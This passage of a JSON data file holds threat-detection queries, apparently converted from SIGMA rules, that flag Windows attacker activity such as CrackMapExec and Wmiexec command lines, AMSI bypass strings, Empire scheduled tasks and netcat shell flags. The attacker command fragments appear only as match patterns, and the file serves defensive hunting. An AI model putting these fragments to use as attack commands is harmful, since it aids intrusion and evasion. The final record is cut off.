        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "HxTsr.exe is a Microsoft compressed executable file called Microsoft Outlook Communications.\nHxTsr.exe is part of Outlook apps, because it resides in a hidden \"WindowsApps\" subfolder of \"C:\\Program Files\".\nAny instances of hxtsr.exe not in this folder may be malware camouflaging itself as HxTsr.exe\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Potential Fake Instance Of Hxtsr.EXE Executed",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\hxtsr.exe\" and (not (tgt.process.image.path contains \":\\program files\\windowsapps\\microsoft.windowscommunicationsapps_\" and tgt.process.image.path contains \"\\hxtsr.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 210
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "HackTool - Wmiexec Default Powershell Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"-NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 211
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects various execution patterns of the CrackMapExec pentesting framework",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1053",
                "t1059",
                "t1059"
            ],
            "name": "HackTool - CrackMapExec Execution Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline=\"*cmd.exe /Q /c * 1> \\\\*\\*\\* 2>&1*\" or tgt.process.cmdline=\"*cmd.exe /C * > \\\\*\\*\\* 2>&1*\" or tgt.process.cmdline=\"*cmd.exe /C * > *\\Temp\\* 2>&1*\" or tgt.process.cmdline contains \"powershell.exe -exec bypass -noni -nop -w 1 -C \\\"\" or tgt.process.cmdline contains \"powershell.exe -noni -nop -w 1 -enc \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 212
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process spawning from an Outlook process.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204"
            ],
            "name": "Suspicious Outlook Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\OUTLOOK.EXE\" and (tgt.process.image.path contains \"\\AppVLP.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mftrace.exe\" or tgt.process.image.path contains \"\\msbuild.exe\" or tgt.process.image.path contains \"\\msdt.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\svchost.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 213
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of special strings/null bits in order to potentially bypass AMSI functionalities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Potential AMSI Bypass Using NULL Bits",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"if(0){{{0}}}' -f $(0 -as [char]) +\" or tgt.process.cmdline contains \"#<NULL>\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 214
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a schtask via PowerSploit or Empire Default Configuration.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053",
                "t1059"
            ],
            "name": "HackTool - Default PowerSploit/Empire Scheduled Task Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/Create\" and tgt.process.cmdline contains \"powershell.exe -NonI\" and tgt.process.cmdline contains \"/TN Updater /TR\") and (tgt.process.cmdline contains \"/SC ONLOGON\" or tgt.process.cmdline contains \"/SC DAILY /ST\" or tgt.process.cmdline contains \"/SC ONIDLE\" or tgt.process.cmdline contains \"/SC HOURLY\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 215
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects addition of users to highly privileged groups via \"Net\" or \"Add-LocalGroupMember\".",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1098"
            ],
            "name": "User Added To Highly Privileged Group",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"localgroup \" and tgt.process.cmdline contains \" /add\") or (tgt.process.cmdline contains \"Add-LocalGroupMember \" and tgt.process.cmdline contains \" -Group \")) and (tgt.process.cmdline contains \"Group Policy Creator Owners\" or tgt.process.cmdline contains \"Schema Admins\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 216
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - AnyDesk Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\AnyDesk.exe\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.displayName=\"AnyDesk\" or tgt.process.publisher=\"AnyDesk Software GmbH\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 217
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"Setup16.EXE\" and old installation utility with a custom \".lst\" file.\nThese \".lst\" file can contain references to external program that \"Setup16.EXE\" will execute.\nAttackers and adversaries might leverage this as a living of the land utility.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Setup16.EXE Execution With Custom .Lst File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path=\"C:\\Windows\\SysWOW64\\setup16.exe\" and src.process.cmdline contains \" -m \") and (not tgt.process.image.path contains \"C:\\~MSSETUP.T\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 218
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious reconnaissance command line activity on Windows systems using the PowerShell Get-LocalGroupMember Cmdlet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087"
            ],
            "name": "Suspicious Reconnaissance Activity Using Get-LocalGroupMember Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Get-LocalGroupMember \" and (tgt.process.cmdline contains \"domain admins\" or tgt.process.cmdline contains \" administrator\" or tgt.process.cmdline contains \" administrateur\" or tgt.process.cmdline contains \"enterprise admins\" or tgt.process.cmdline contains \"Exchange Trusted Subsystem\" or tgt.process.cmdline contains \"Remote Desktop Users\" or tgt.process.cmdline contains \"Utilisateurs du Bureau \u00e0 distance\" or tgt.process.cmdline contains \"Usuarios de escritorio remoto\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 219
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1113"
            ],
            "name": "Screen Capture Activity Via Psr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\Psr.exe\" and (tgt.process.cmdline contains \"/start\" or tgt.process.cmdline contains \"-start\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 220
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a code page switch in command line or batch scripts to a rare language",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious CodePage Switch Via CHCP",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\chcp.com\" and (tgt.process.cmdline contains \" 936\" or tgt.process.cmdline contains \" 1258\"))) | columns src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 221
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious encoded character syntax often used for defense evasion",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1027"
            ],
            "name": "Potential PowerShell Obfuscation Via WCHAR",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"(WCHAR)0x\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 222
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1095"
            ],
            "name": "PUA - Netcat Suspicious Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\nc.exe\" or tgt.process.image.path contains \"\\ncat.exe\" or tgt.process.image.path contains \"\\netcat.exe\") or (tgt.process.cmdline contains \" -lvp \" or tgt.process.cmdline contains \" -lvnp\" or tgt.process.cmdline contains \" -l -v -p \" or tgt.process.cmdline contains \" -lv -p \" or tgt.process.cmdline contains \" -l --proxy-type http \" or tgt.process.cmdline contains \" -vnl --exec \" or tgt.process.cmdline contains \" -vnl -e \" or tgt.process.cmdline contains \" --lua-exec \" or tgt.process.cmdline contains \" --sh-exec \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 223
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "ImagingDevices Unusual Parent/Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WmiPrvSE.exe\" or src.process.image.path contains \"\\svchost.exe\" or src.process.image.path contains \"\\dllhost.exe\") and tgt.process.image.path contains \"\\ImagingDevices.exe\") or src.process.image.path contains \"\\ImagingDevices.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 224
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1018"
            ],
            "name": "Suspicious Scan Loop Network",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"for \" or tgt.process.cmdline contains \"foreach \") and (tgt.process.cmdline contains \"nslookup\" or tgt.process.cmdline contains \"ping\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 225
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious msiexec process starts with web addresses as parameter",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1105"
            ],
            "name": "MsiExec Web Install",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" msiexec\" and tgt.process.cmdline contains \"://\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 226
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
